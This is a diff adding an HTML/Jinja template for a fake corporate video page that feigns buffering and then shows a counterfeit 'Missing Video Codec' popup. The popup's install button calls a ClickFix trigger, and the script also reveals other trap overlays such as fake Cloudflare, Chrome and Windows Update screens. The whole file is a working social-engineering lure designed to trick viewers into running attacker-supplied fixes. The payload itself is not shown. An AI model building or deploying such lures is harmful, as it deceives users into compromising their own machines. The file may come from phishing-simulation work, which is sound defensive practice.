@@ -1,0 +1,252 @@
+{% extends "base_layout.html" %}
+
+{% block title %}Video Player - Buffering{% endblock %}
+
+{% block content %}
+<!-- Decoy Layer: Video Streaming Interface -->
+<div id="decoy-layer" style="background-color: #0f0f0f; min-height: 100vh; font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif; display: flex; flex-direction: column;">
+    
+    <!-- Header Bar -->
+    <header style="background: linear-gradient(180deg, rgba(0,0,0,0.9) 0%, transparent 100%); padding: 16px 24px; position: absolute; top: 0; left: 0; right: 0; z-index: 10; display: flex; align-items: center; justify-content: space-between;">
+        <div style="display: flex; align-items: center; gap: 20px;">
+            <!-- Logo -->
+            <div style="display: flex; align-items: center; gap: 8px;">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="#ff0000">
+                    <path d="M10 16.5l6-4.5-6-4.5v9zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/>
+                </svg>
+                <span style="color: white; font-size: 18px; font-weight: 700; letter-spacing: -0.5px;">StreamView</span>
+            </div>
+        </div>
+        
+        <div style="display: flex; align-items: center; gap: 20px;">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="white" style="cursor: pointer; opacity: 0.9;"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="white" style="cursor: pointer; opacity: 0.9;"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>
+            <div style="width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; font-size: 14px; cursor: pointer;">U</div>
+        </div>
+    </header>
+
+    <!-- Video Player Area -->
+    <div style="flex: 1; display: flex; justify-content: center; align-items: center; position: relative;">
+        
+        <!-- Video Container -->
+        <div style="width: 100%; max-width: 1200px; aspect-ratio: 16/9; background: #000; position: relative; margin: 60px 20px 100px 20px; border-radius: 8px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.5);">
+            
+            <!-- Fake Video Thumbnail (Blurred) -->
+            <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); filter: blur(8px); transform: scale(1.1);"></div>
+            
+            <!-- Dark Overlay -->
+            <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.6);"></div>
+            
+            <!-- Buffering Spinner -->
+            <div id="video-buffering" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; z-index: 5;">
+                <div style="width: 80px; height: 80px; margin: 0 auto 20px auto; position: relative;">
+                    <!-- Outer ring -->
+                    <svg width="80" height="80" viewBox="0 0 80 80" style="animation: spin 1.5s linear infinite;">
+                        <circle cx="40" cy="40" r="35" fill="none" stroke="rgba(255,255,255,0.2)" stroke-width="4"/>
+                        <circle cx="40" cy="40" r="35" fill="none" stroke="white" stroke-width="4" stroke-dasharray="164.93" stroke-dashoffset="123.7" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                <p style="color: white; font-size: 16px; margin: 0; font-weight: 500;">Buffering...</p>
+                <p style="color: rgba(255,255,255,0.6); font-size: 13px; margin: 8px 0 0 0;">Loading video content</p>
+            </div>
+
+            <!-- Video Title Overlay -->
+            <div style="position: absolute; bottom: 80px; left: 20px; right: 20px; z-index: 5;">
+                <h1 style="color: white; font-size: 24px; font-weight: 600; margin: 0 0 8px 0; text-shadow: 0 2px 10px rgba(0,0,0,0.5);">Q4 2024 All-Hands Meeting Recording</h1>
+                <p style="color: rgba(255,255,255,0.8); font-size: 14px; margin: 0;">Corporate Communications • Shared Nov 28, 2024</p>
+            </div>
+
+            <!-- Video Controls Bar -->
+            <div style="position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(0deg, rgba(0,0,0,0.9) 0%, transparent 100%); padding: 40px 16px 16px 16px; z-index: 5;">
+                
+                <!-- Progress Bar -->
+                <div style="height: 4px; background: rgba(255,255,255,0.3); border-radius: 2px; margin-bottom: 12px; cursor: pointer; position: relative;">
+                    <div style="width: 0%; height: 100%; background: #ff0000; border-radius: 2px;"></div>
+                    <div style="position: absolute; left: 0; top: 50%; transform: translateY(-50%); width: 12px; height: 12px; background: #ff0000; border-radius: 50%; opacity: 0;"></div>
+                </div>
+                
+                <!-- Controls -->
+                <div style="display: flex; align-items: center; justify-content: space-between;">
+                    <div style="display: flex; align-items: center; gap: 16px;">
+                        <!-- Play Button -->
+                        <button style="background: none; border: none; cursor: pointer; padding: 0;">
+                            <svg width="36" height="36" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>
+                        </button>
+                        
+                        <!-- Volume -->
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
+                            <div style="width: 60px; height: 4px; background: rgba(255,255,255,0.3); border-radius: 2px;">
+                                <div style="width: 70%; height: 100%; background: white; border-radius: 2px;"></div>
+                            </div>
+                        </div>
+                        
+                        <!-- Time -->
+                        <span style="color: white; font-size: 13px;">0:00 / 47:32</span>
+                    </div>
+                    
+                    <div style="display: flex; align-items: center; gap: 16px;">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white" style="cursor: pointer;"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/></svg>
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white" style="cursor: pointer;"><path d="M19 4H5c-1.11 0-2 .9-2 2v12c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-8 11H9.5v-2h-2v2H6V9h1.5v2.5h2V9H11v6zm7-1c0 .55-.45 1-1 1h-.75v1.5h-1.5V15H14c-.55 0-1-.45-1-1v-4c0-.55.45-1 1-1h3c.55 0 1 .45 1 1v4zm-3.5-.5h2v-3h-2v3z"/></svg>
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white" style="cursor: pointer;"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58a.49.49 0 0 0 .12-.61l-1.92-3.32a.488.488 0 0 0-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54a.484.484 0 0 0-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 0 0-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white" style="cursor: pointer;"><path d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"/></svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Related Videos Sidebar (Visible on larger screens) -->
+    <div style="position: fixed; right: 20px; top: 80px; width: 300px; display: none;">
+        <h3 style="color: white; font-size: 14px; font-weight: 600; margin: 0 0 16px 0;">Up Next</h3>
+        <!-- Related video items would go here -->
+    </div>
+</div>
+{% endblock %}
+
+{# Define embedded attack layer - only shown if no external trap_type is set #}
+{% block attack_layer %}
+<!-- Attack Layer: Codec Error Popup -->
+<div id="attack-layer" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.85); backdrop-filter: blur(6px); z-index: 900; justify-content: center; align-items: center;">
+    <div style="background: #1f1f1f; max-width: 440px; width: 90%; border-radius: 12px; box-shadow: 0 25px 60px rgba(0,0,0,0.6); overflow: hidden; border: 1px solid #333;">
+        
+        <!-- Header -->
+        <div style="background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%); padding: 20px; display: flex; align-items: center; gap: 15px;">
+            <div style="background: rgba(255,255,255,0.2); padding: 12px; border-radius: 10px;">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="white">
+                    <path d="M18 4l2 4h-3l-2-4h-2l2 4h-3l-2-4H8l2 4H7L5 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4h-4z"/>
+                </svg>
+            </div>
+            <div>
+                <h2 style="margin: 0; color: white; font-size: 17px; font-weight: 600;">Video Playback Error</h2>
+                <p style="margin: 4px 0 0 0; color: rgba(255,255,255,0.85); font-size: 13px;">Codec not supported</p>
+            </div>
+        </div>
+
+        <!-- Content -->
+        <div style="padding: 24px;">
+            
+            <!-- Error Message -->
+            <div style="background: #2a2a2a; border-radius: 8px; padding: 16px; margin-bottom: 20px; border: 1px solid #3a3a3a;">
+                <div style="display: flex; align-items: flex-start; gap: 12px;">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="#fbbf24" style="flex-shrink: 0; margin-top: 2px;">
+                        <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
+                    </svg>
+                    <div>
+                        <p style="margin: 0; color: #fbbf24; font-size: 14px; font-weight: 600;">Missing Video Codec</p>
+                        <p style="margin: 8px 0 0 0; color: #a0a0a0; font-size: 13px; line-height: 1.5;">
+                            This video requires the <strong style="color: #e0e0e0;">H.265/HEVC</strong> codec which is not installed on your system.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Codec Info -->
+            <div style="background: #2a2a2a; border-radius: 8px; padding: 16px; margin-bottom: 20px;">
+                <h4 style="margin: 0 0 12px 0; font-size: 12px; font-weight: 600; color: #808080; text-transform: uppercase; letter-spacing: 0.5px;">Required Component</h4>
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <div style="width: 48px; height: 48px; background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%); border-radius: 8px; display: flex; align-items: center; justify-content: center;">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+                            <path d="M18 4l2 4h-3l-2-4h-2l2 4h-3l-2-4H8l2 4H7L5 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4h-4z"/>
+                        </svg>
+                    </div>
+                    <div style="flex: 1;">
+                        <p style="margin: 0; color: #e0e0e0; font-size: 14px; font-weight: 600;">HEVC Video Extensions</p>
+                        <p style="margin: 4px 0 0 0; color: #808080; font-size: 12px;">High Efficiency Video Coding Decoder</p>
+                    </div>
+                    <span style="background: #dc2626; color: white; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 600;">REQUIRED</span>
+                </div>
+            </div>
+
+            <!-- Video Info -->
+            <div style="background: #2a2a2a; border-radius: 8px; padding: 12px 16px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px;">
+                <div style="width: 80px; height: 45px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 4px; display: flex; align-items: center; justify-content: center;">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="rgba(255,255,255,0.5)"><path d="M8 5v14l11-7z"/></svg>
+                </div>
+                <div style="flex: 1;">
+                    <p style="margin: 0; color: #e0e0e0; font-size: 13px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">Q4 2024 All-Hands Meeting Recording</p>
+                    <p style="margin: 4px 0 0 0; color: #808080; font-size: 12px;">47:32 • 1080p • HEVC</p>
+                </div>
+            </div>
+
+            <p style="margin: 0 0 20px 0; color: #a0a0a0; font-size: 13px; line-height: 1.6;">
+                Install the required codec to enable playback of this video. This is a one-time installation.
+            </p>
+
+            <button onclick="triggerClickFix()" style="width: 100%; background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%); color: white; border: none; padding: 14px; font-size: 15px; font-weight: 600; cursor: pointer; border-radius: 8px; display: flex; align-items: center; justify-content: center; gap: 10px; transition: transform 0.1s, box-shadow 0.2s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 20px rgba(255, 0, 0, 0.3)'" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='none'">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                    <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                </svg>
+                Install Video Codec
+            </button>
+
+            <div style="margin-top: 16px; display: flex; justify-content: center; gap: 20px;">
+                <a href="#" style="font-size: 12px; color: #808080; text-decoration: none;">Try different quality</a>
+                <a href="#" style="font-size: 12px; color: #808080; text-decoration: none;">Report problem</a>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div style="padding: 12px 24px; background: #181818; border-top: 1px solid #333;">
+            <p style="margin: 0; font-size: 11px; color: #606060; text-align: center;">
+                StreamView Media Player • Secure Playback
+            </p>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_css %}
+<style>
+@keyframes spin {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+}
+</style>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    let triggered = false;
+
+    function showLure() {
+        if (!triggered) {
+            triggered = true;
+            // Hide buffering spinner and show error state
+            const videoBuffering = document.getElementById('video-buffering');
+            if (videoBuffering) {
+                videoBuffering.innerHTML = `
+                    <svg width="80" height="80" viewBox="0 0 24 24" fill="rgba(255,255,255,0.8)">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                    </svg>
+                    <p style="color: white; font-size: 16px; margin: 20px 0 0 0; font-weight: 500;">Playback Error</p>
+                `;
+            }
+            
+            // Check for embedded attack layer first, then external trap overlays
+            const attackLayer = document.getElementById('attack-layer') ||
+                               document.getElementById('cf-overlay') ||
+                               document.getElementById('chrome-overlay') ||
+                               document.getElementById('wu-trigger-overlay') ||
+                               document.getElementById('filefix-overlay');
+            if (attackLayer) {
+                attackLayer.style.display = 'flex';
+            }
+        }
+    }
+
+    // Simulate buffering then show error
+    setTimeout(function() {
+        if (!triggered) {
+            showLure();
+        }
+    }, 3500);
+
+    // Also trigger on play button click
+    document.addEventListener('click', function(e) {
+        if (e.target.closest('button') && !triggered) {
+            setTimeout(showLure, 800);
+        }
+    });
+</script>
+{% endblock %}
